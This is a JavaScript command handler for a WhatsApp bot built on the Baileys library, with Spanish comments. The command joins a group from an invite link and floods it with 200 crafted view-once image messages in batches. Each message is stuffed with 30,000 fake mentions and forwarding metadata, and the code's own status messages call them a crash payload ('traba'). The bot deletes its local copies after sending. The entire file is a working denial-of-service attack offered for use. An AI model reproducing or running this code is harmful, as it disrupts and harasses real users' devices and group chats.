import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn, args }) => {
  // 🔧 Normalizador de JID (quita @ y : para comparar solo el número)
  const normalizeJid = jid => jid?.toString()?.trim()?.toLowerCase()?.split('@')[0]?.split(':')[0];
  const senderNumber = normalizeJid(m.sender);
  const botNumber = normalizeJid(conn.user.id);

  if (senderNumber !== botNumber) {
    return m.reply('❌ Solo el número donde está vinculado el bot puede ejecutar este comando.');
  }

  if (!args[0]) return m.reply('❌ Debes enviar un enlace de invitación a un grupo.');

  // Extraer código de invitación del link
  const inviteLink = args[0];
  const match = inviteLink.match(/chat\.whatsapp\.com\/([0-9A-Za-z]{20,})/);
  if (!match) return m.reply('❌ Link de invitación inválido.');

  const inviteCode = match[1];

  await m.reply('⏳ Uniéndome al grupo, por favor espera...');

  let groupJid;
  try {
    groupJid = await conn.groupAcceptInvite(inviteCode);
  } catch (e) {
    return m.reply('❌ No pude unirme al grupo. Es posible que ya esté en él o que el código sea inválido.');
  }

  await m.reply(`✅ Me uní al grupo correctamente. Empezando a enviar mensajes en tandas durante 5 minutos.`);

  const mensajesPorTanda = 20;
  const totalMensajes = 200;
  const tandas = totalMensajes / mensajesPorTanda;
  const intervaloTanda = 30000; // 30 segundos entre tandas

  for (let i = 0; i < tandas; i++) {
    setTimeout(() => {
      enviarTandaIsagi(conn, groupJid, i + 1, m);
    }, i * intervaloTanda);
  }
};

handler.command = /^atraso-grup$/i;
export default handler;

// ⏱️ Función delay
function delay(ms) {
  return new Promise(res => setTimeout(res, ms));
}

// 🐉 Función principal de mensaje invisible
async function isagivisble1(target, mention, conn) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "🐉 𝐁𝐲 𝐓𝐨𝐛𝐢 🐉",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});
  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta", attrs: {}, content: [{
        tag: "mentioned_users", attrs: {}, content: [{
          tag: "to", attrs: { jid: target }, content: undefined
        }]
      }]
    }]
  });

  if (mention) {
    await conn.relayMessage(target, {
      statusMentionMessage: {
        message: { protocolMessage: { key: msg.key, type: 25 } }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: { is_status_mention: "🐉 𝐁𝐲 𝐓𝐨𝐛𝐢 🐉" },
        content: undefined
      }]
    });
  }

  return msg;
}

// 🚀 Función que envía una tanda de 20 mensajes
async function enviarTandaIsagi(conn, jid, num, m) {
  try {
    for (let i = 0; i < 20; i++) {
      const msg = await isagivisble1(jid, false, conn);
      await delay(1000); // espera 1 segundo entre cada mensaje
      await conn.sendMessage(conn.user.id, { delete: msg.key }); // elimina local
    }

    await conn.sendMessage(m.chat, {
      text: `✅ Traba ${num}/10 enviada correctamente.`,
    }, { quoted: m });

  } catch (e) {
    console.error("❌ Error en tanda:", e);
    await conn.sendMessage(m.chat, {
      text: "❌ Error en tanda:\n" + e.message,
    }, { quoted: m });
  }
}